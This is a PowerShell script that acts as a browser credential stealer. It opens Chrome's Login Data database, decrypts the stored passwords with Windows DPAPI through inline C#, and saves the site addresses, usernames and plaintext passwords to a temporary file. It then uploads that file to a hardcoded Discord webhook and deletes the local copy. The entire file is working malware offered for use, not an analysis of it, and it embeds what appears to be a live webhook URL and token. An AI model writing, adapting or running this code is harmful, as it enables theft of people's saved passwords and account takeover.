# Define the Discord Webhook URL
$webhook = "https://discord.com/api/webhooks/1315398167768076348/FHFvfm3hhnJDsTNvuTR-5oB86OJY7kUwI-4F5S_Hxn7SdgZY1gXxaRQFuMO-yFFwPnPT"

# Function for sending messages through Discord Webhook
function Send-DiscordMessage {
    param (
        [string]$message
    )

    $body = @{
        content = $message
    }

    try {
        Invoke-RestMethod -Uri $webhook -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
    } catch {
        Write-Host "Failed to send message to Discord: $_"
    }
}

# Function to decrypt Chrome password using DPAPI
function Decrypt-ChromePassword {
    param (
        [byte[]]$encryptedPassword
    )

    # Use DPAPI to decrypt the password (for Windows systems)
    Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    using System.Security.Cryptography;
    using System.Text;

    public class DPAPI {
        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr LocalAlloc(int uFlags, uint sizetdwBytes);
        
        [DllImport("crypt32.dll", CharSet = CharSet.Auto)]
        public static extern bool CryptUnprotectData(ref DATA_BLOB pDataIn, ref string ppszDataDescr, ref DATA_BLOB pOptionalEntropy, IntPtr pvReserved, ref CRYPTPROTECT_PROMPTSTRUCT pPrompt, int dwFlags, ref DATA_BLOB pDataOut);
        
        [StructLayout(LayoutKind.Sequential)]
        public struct DATA_BLOB {
            public uint cbData;
            public IntPtr pbData;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CRYPTPROTECT_PROMPTSTRUCT {
            public uint cbSize;
            public uint dwPromptFlags;
            public IntPtr hwndApp;
            public string szPrompt;
        }

        public static string Decrypt(byte[] encryptedData) {
            DATA_BLOB dataIn = new DATA_BLOB();
            dataIn.cbData = (uint)encryptedData.Length;
            dataIn.pbData = Marshal.AllocHGlobal(encryptedData.Length);
            Marshal.Copy(encryptedData, 0, dataIn.pbData, encryptedData.Length);

            DATA_BLOB dataOut = new DATA_BLOB();
            string description = null;
            CRYPTPROTECT_PROMPTSTRUCT prompt = new CRYPTPROTECT_PROMPTSTRUCT();
            prompt.cbSize = (uint)Marshal.SizeOf(typeof(CRYPTPROTECT_PROMPTSTRUCT));

            bool result = CryptUnprotectData(ref dataIn, ref description, ref dataOut, IntPtr.Zero, ref prompt, 0, ref dataOut);
            if (result) {
                byte[] decryptedData = new byte[dataOut.cbData];
                Marshal.Copy(dataOut.pbData, decryptedData, 0, decryptedData.Length);
                Marshal.FreeHGlobal(dataIn.pbData);
                Marshal.FreeHGlobal(dataOut.pbData);

                return Encoding.UTF8.GetString(decryptedData);
            }

            return null;
        }
    }
"@ -Language CSharp

    return [DPAPI]::Decrypt($encryptedPassword)
}

# Function to extract passwords from Chrome's Login Data
function Extract-ChromePasswords {
    param (
        [string]$chromeLoginDataPath,
        [string]$outputFilePath
    )

    # Check if the Login Data file exists
    if (-not (Test-Path $chromeLoginDataPath)) {
        Write-Host "Login Data file not found: $chromeLoginDataPath"
        return
    }

    try {
        # Open the Login Data file (SQLite database)
        $connectionString = "Data Source=$chromeLoginDataPath;Version=3;"
        $connection = New-Object System.Data.SQLite.SQLiteConnection($connectionString)
        $connection.Open()

        # Query to get the login data
        $command = $connection.CreateCommand()
        $command.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
        $reader = $command.ExecuteReader()

        # Prepare output string
        $output = ""

        while ($reader.Read()) {
            $origin_url = $reader["origin_url"]
            $username = $reader["username_value"]
            $encryptedPassword = $reader["password_value"]

            # Decrypt the password
            $password = Decrypt-ChromePassword -encryptedPassword $encryptedPassword

            # Append to the output string
            $output += "Origin: $origin_url`nUsername: $username`nPassword: $password`n`n"
        }

        # Save the result to a text file
        $output | Out-File -FilePath $outputFilePath

        # Close the database connection
        $connection.Close()

        Write-Host "Decoded passwords saved to: $outputFilePath"

    } catch {
        Write-Host "Error extracting passwords: $_"
    }
}

# Function for uploading files to Discord via webhook
function Upload-FileToDiscord {
    param (
        [string]$filePath
    )

    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
    $fileName = [System.IO.Path]::GetFileName($filePath)

    $boundary = "----WebKitFormBoundary" + [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"
    $bodyLines = (
        "--$boundary",
        "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
        "Content-Type: application/octet-stream",
        $LF,
        [System.Text.Encoding]::ASCII.GetString($fileBytes),
        "--$boundary--",
        $LF
    ) -join $LF

    $headers = @{
        "Content-Type" = "multipart/form-data; boundary=$boundary"
    }

    try {
        # Send the file to Discord via webhook
        $response = Invoke-RestMethod -Uri $webhook -Method Post -Body $bodyLines -Headers $headers
        Write-Host "File uploaded successfully."
    } catch {
        Write-Host "Failed to upload file to Discord: $_"
    }
}

# Check for Chrome executable and user data
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$loginDataPath = "$chromePath\Default\Login Data"
if (-not (Test-Path $loginDataPath)) {
    Send-DiscordMessage -message "Chrome Login Data not found!"
    exit
}

# Define the output path for the decoded passwords file
$outputFile = "$env:TEMP\chrome_passwords.txt"

# Extract and decode passwords
Extract-ChromePasswords -chromeLoginDataPath $loginDataPath -outputFilePath $outputFile

# Upload the .txt file containing decoded passwords to Discord
Upload-FileToDiscord -filePath $outputFile

# Optionally, remove the .txt file after uploading
Remove-Item $outputFile
